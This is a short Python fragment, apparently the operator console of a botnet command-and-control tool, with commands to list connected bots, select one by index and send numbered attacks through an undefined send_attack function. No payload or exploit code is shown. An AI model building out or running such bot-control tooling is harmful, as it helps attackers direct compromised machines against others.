def commands():
    while True:
        com = input(">>> ")
        if com == "":
            continue
        elif com == "help" or com == "h":
            print("COMMANDS")
            print("help\nlist\nselect\nattacks\noptions")
        elif com == "list" or com == "l":
            check_conns()
            for i in range(len(connections)):
                print(f"[{i}]\t{addresses[i][0]}:{addresses[i][1]}")
        elif com.split()[0] == "select" or com.split()[0] == "s":
            try:
                target = com.split()[1]
            except:
                print("[!] USE: s <bot index>")
        elif com.split()[0] == "attacks" or com.split()[0] == "a":
            if len(com.split()) != 2 or not com.split()[1].isdigit():
                print("[!] USE: a <attack index>")
                print("MODULE ATTACKS")
            else:
                try:
                    send_attack(target,com.split()[1])
                except:
                    print("[!] First select a target")
                continue

